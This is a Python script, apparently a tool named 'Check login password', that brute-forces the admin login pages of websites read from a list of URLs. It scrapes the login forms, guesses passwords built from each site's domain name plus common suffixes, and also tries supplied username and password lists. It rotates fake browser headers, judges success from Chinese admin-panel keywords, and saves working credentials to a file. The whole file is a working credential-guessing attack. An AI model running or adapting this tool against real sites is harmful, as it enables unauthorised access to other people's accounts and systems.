# -*- coding:utf-8 -*-
from concurrent.futures import ThreadPoolExecutor
import random
import requests
import time
from bs4 import BeautifulSoup as bp
requests.packages.urllib3.disable_warnings()
timeout=5
def headers(refer):
    REFERERS = [
        "https://www.baidu.com",
        "http://www.baidu.com",
        "https://www.google.com.hk",
        "http://www.so.com",
        "http://www.sogou.com",
        "http://www.soso.com",
        "http://www.bing.com",
    ]

    headerss = [
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
        "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"]
    if refer:
        pass
    else:
        refer = random.choice(REFERERS)
    headers = {
        'User-Agent': random.choice(headerss),
        'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Cache-Control': 'max-age=0',
        'referer': refer,
        'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
    }
    return headers

def get_user_password_name(url):
    try:
        r = requests.get(url=url, headers=headers(url), timeout=timeout, verify=False)
        users = ''
        bs = bp(r.content, 'html.parser')
        username = bs.find_all('input', type="text")

        if len(username) == 1:
            users = username[0]['name']

        if not users:
            for n in username:
                if 'user' in n['name'].lower():
                    users = n['name']
                    break
                if 'name' in n['name'].lower():
                    users = n['name']
                    break
                if 'account' in n['name'].lower():
                    users = n['name']
                    break
        if not users:
            users = 'account_name'
        password = bs.find_all('input', type="password")

        if len(password) == 1:
            try:
                passs = password[0]['name']
            except:
                passs = 'password'
        else:
            passs = 'password'
        return users, passs
    except Exception as e:
        return None

def get_domain(url):
    try:
        if 'www' not in url:
            if url.count('.') == 1:
                return url.split('.')[0]
            if url.count('.') == 2:
                return url.split('.')[1]
            if url.count('.') == 3:
                return url.split('.')[1]
            if url.count('.') == 4:
                return url.split('.')[2]
        else:
            if url.count('.') == 2:
                return url.split('.')[1]
            if url.count('.') == 3:
                return url.split('.')[1]
            if url.count('.') == 4:
                return url.split('.')[2]
            else:
                return url.split('.')[3]
    except:
        return url.split('/')[1].split('.')[1]




def login_success_check(content):
    if '您的请求带有不合法参数' in content:
        return False
    if '已被网站管理员设置为拦截' in content:
        return False
    if '当前访问疑似' in content:
        return False
    if '登陆成功' in content:
        return True
    if '退出登陆' in content:
        return True
    # if '账号管理' in content:
    #     return True
    # if '账号列表' in content:
    #     return True
    # if '用户管理' in content:
    #     return True
    # if '个人资料' in content:
    #     return True
    #
    # if '欢迎您' in content:
    #     return True
    # if 'login success' in content:
    #     return True
    if '退出系统' in content:
        return True
    if '上次登陆' in content:
        return True
    if '上次登陆IP' in content:
        return True
    if '安全设置' in content:
        return True
    if '账号绑定' in content:
        return True
    if '退出账号' in content:
        return True
    if '文章管理' in content:
        return True
    if '消息中心' in content:
        return True
    if '管理员设置' in content:
        return True

    if '用户中心' in content:
        return True
    if '注销' in content:
        return True
    if '会员列表' in content:
        return True
    if '服务器信息' in content:
        return True
    # if '订单列表' in content:
    #     return True
    if '<frame frameborder="0" id="frame_navigation"' in content:
        return True
    if 'Router Configuration' in content:
        return True


def post_data(url, usernames, passwords):

    users_and_passs = get_user_password_name(url)
    if users_and_passs != None:
        print('成功提取到后台账号密码登入点')
        username = users_and_passs[0]
        password = users_and_passs[1]
    else:
        return None
    time.sleep(3)
    password_list = []
    passwords_01 = get_domain(url)
    passwords_02 = get_domain(url)+'123456'
    passwords_03 = get_domain(url)+'000000'
    passwords_04 = get_domain(url)+'123'
    passwords_05 = get_domain(url)+'888888'
    passwords_06 = get_domain(url)+'88888888'
    passwords_07 = get_domain(url)+'666666'
    passwords_08 = get_domain(url)+'12345'
    passwords_09 = get_domain(url)+'0'
    password_list.append(passwords_01)
    password_list.append(passwords_02)
    password_list.append(passwords_03)
    password_list.append(passwords_04)
    password_list.append(passwords_05)
    password_list.append(passwords_06)
    password_list.append(passwords_07)
    password_list.append(passwords_08)
    password_list.append(passwords_09)

    u1 = get_domain(url)
    for p in password_list:
        data1 = {username: u1,
                password: p}
        print(data1)
        print('尝试检测网址:{}|:账号:{}|密码:{}|'.format(url,u1,p))
        try:
            r = requests.post(url=url, data=data1, timeout=timeout)
            # encoding = requests.utils.get_encodings_from_content(r.text)[0]
            # res = r.content.decode(encoding, 'replace')
            result = login_success_check(r.text)
            if result:
                with open('success.txt','a+')as a:
                    a.write('登陆网址:{}|:账号:{}|密码:{}|'.format(url,u1,p) + '\n')
                return ''
            else:
                print('登陆失败')
        except:
            print('登陆失败')

    for p in password:
        data1 = {username: u1,
                password: p}
        print(data1)
        print('尝试检测网址:{}|:账号:{}|密码:{}|'.format(url,u1,p))
        try:
            r = requests.post(url=url, data=data1, timeout=timeout)
            # encoding = requests.utils.get_encodings_from_content(r.text)[0]
            # res = r.content.decode(encoding, 'replace')
            result = login_success_check(r.text)
            if result:
                with open('success.txt','a+')as a:
                    a.write('登陆网址:{}|:账号:{}|密码:{}|'.format(url,u1,p) + '\n')
                return ''
            else:
                print('登陆失败')
        except:
            print('登陆失败')


    for u in usernames:
        for p in passwords:
            data = {username: u,
                    password: p}
            print(data)
            print('尝试检测网址:{}|:账号:{}|密码:{}|'.format(url,u,p))
            try:
                r = requests.post(url=url, data=data, timeout=timeout)
                #encoding = requests.utils.get_encodings_from_content(r.text)[0]
                #res = r.content.decode(encoding, 'replace')
                result = login_success_check(r.text)
                if result:
                    with open('success.txt','a+')as a:
                        a.write('登陆网址:{}|:账号:{}|密码:{}|'.format(url,u,p) + '\n')
                    return ''
                else:
                    print('登陆失败')
            except:
                print('登陆失败')
        for p in password_list:
            data = {username: u,
                    password: p}
            print(data)
            print('尝试检测网址:{}|:账号:{}|密码:{}|'.format(url,u,p))
            try:
                r = requests.post(url=url, data=data, timeout=timeout)
                encoding = requests.utils.get_encodings_from_content(r.text)[0]
                res = r.content.decode(encoding, 'replace')
                result = login_success_check(res)
                if result:
                    with open('success.txt','a+')as a:
                        a.write('登陆网址:{}|:账号:{}|密码:{}|'.format(url,u,p) + '\n')
                    return ''
                else:
                    print('登陆失败')
            except:
                print('登陆失败')

if __name__ =='__main__':
    print ('''

             _                           _ 
            | |                         (_)
            | |     __ _ _ __   __ _ _____ 
            | |    / _` | '_ \ / _` |_  / |
            | |___| (_| | | | | (_| |/ /| |
            |______\__,_|_| |_|\__, /___|_|
                                __/ |      Check login password
                               |___/       Version:0.5
                                           Datetime:2019-03-09-15:11:36

    ''')
    urls = input('Input Manager urls:')
    usernames = input('Input Username:')
    passwords = input('Input Password:')

    urls = list([x.strip() for x in open(urls,'r').readlines()])
    usernames = list([x.strip() for x in open(usernames,'r').readlines()])
    passwords = list([x.strip() for x in open(passwords,'r').readlines()])

    p = ThreadPoolExecutor()
    all_tasks = [p.submit(post_data,url,usernames,passwords) for url in urls]

    res = [x.result() for x in all_tasks]
    p.shutdown()

